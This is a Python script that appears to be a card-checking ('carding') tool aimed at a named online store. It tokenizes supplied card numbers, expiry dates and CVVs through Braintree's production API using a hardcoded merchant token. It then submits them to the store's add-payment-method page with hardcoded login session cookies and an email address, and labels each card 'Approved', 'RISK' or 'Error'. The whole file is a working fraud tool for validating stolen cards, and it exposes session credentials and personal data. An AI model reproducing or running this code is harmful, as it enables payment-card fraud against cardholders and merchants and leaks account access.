def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()




	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjA0ODkzNzksImp0aSI6ImM4ZTczNDFkLTE2MDYtNGVmOS04YTk0LTlmODczODk5ZTJiMSIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoic3R1ZHlub3Rlc2FiYWxsY19pbnN0YW50In19.N3toyOav2p7ZM3391BY7T6YetDH5Et_7HfPwAcP3wFaN4UCcgIenLDsQPw_N3hmb8tF-G61w3KWJCU5AF5VnJg',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '630820e3-6e13-43e2-8e9c-572662b4f50b',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'hhfhfbfv',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"630820e3-6e13-43e2-8e9c-572662b4f50b"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4610460310238167","expirationMonth":"12","expirationYear":"2028","cvv":"333","billingAddress":{"postalCode":"10080","streetAddress":"hhfhfbfv"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)

	tok = response.json()['data']['tokenizeCreditCard']['token']













	cookies = {
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
    'PHPSESSID': 'f86bd8c10c3935d5fa016fc1e79a4897',
    '_ga': 'GA1.1.998389256.1720402750',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-08%2001%3A39%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-08%2001%3A39%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_fbp': 'fb.1.1720402754229.108781710779578398',
    'cookielawinfo-checkbox-necessary': 'yes',
    'mailchimp.cart.current_email': 'moh5527vbnm@gmail.com',
    'mailchimp.cart.previous_email': 'moh5527vbnm@gmail.com',
    'mailchimp_user_email': 'moh5527vbnm%40gmail.com',
    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWV9',
    'viewed_cookie_policy': 'yes',
    'wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76': 'moh5527vbnm%7C1721612433%7C2hgXUTLqNCB4RAzJ5l1lLBpCvIjAS0ecQaUgDyoCcIX%7C3f388b730b54306f01c39a47d8776b373d5322393a804f184ec2893532bff4ae',
    '_ga_SGEGXEGQDY': 'GS1.1.1720402749.1.1.1720402980.1.0.0',
    '_ga_WNQMQBX793': 'GS1.1.1720402752.1.1.1720402981.60.0.0',
    'sbjs_session': 'pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
}

	headers = {
    'authority': 'www.studynotesaba.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; PHPSESSID=f86bd8c10c3935d5fa016fc1e79a4897; _ga=GA1.1.998389256.1720402750; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-08%2001%3A39%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-08%2001%3A39%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _fbp=fb.1.1720402754229.108781710779578398; cookielawinfo-checkbox-necessary=yes; mailchimp.cart.current_email=moh5527vbnm@gmail.com; mailchimp.cart.previous_email=moh5527vbnm@gmail.com; mailchimp_user_email=moh5527vbnm%40gmail.com; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76=moh5527vbnm%7C1721612433%7C2hgXUTLqNCB4RAzJ5l1lLBpCvIjAS0ecQaUgDyoCcIX%7C3f388b730b54306f01c39a47d8776b373d5322393a804f184ec2893532bff4ae; _ga_SGEGXEGQDY=GS1.1.1720402749.1.1.1720402980.1.0.0; _ga_WNQMQBX793=GS1.1.1720402752.1.1.1720402981.60.0.0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
    'origin': 'https://www.studynotesaba.com',
    'pragma': 'no-cache',
    'referer': 'https://www.studynotesaba.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"b4f9cc6c3ad8a537f90e37d2e8dbab67","fraud_merchant_id":null,"correlation_id":"a7dcd4dc52493fcfb6df9c65eaa40081"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjA0ODkyNDIsImp0aSI6ImU0YTVkYjU2LTdjYzktNDFhNC04NTFhLWM2NjU3YTlkNGQxNiIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.eWBxpPvHouwuILBdFafGCxcmj9hHH_A-aa_0QsyPN59oWZqHUspGXGRvibTxCvdr6za7uBkbtFCXIetQWEMugw","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': 'ec07ac917f',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post(
    'https://www.studynotesaba.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)

	pattern = r'Reason: (.*?)\s*</li>'
    
	text = response.text
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	
	
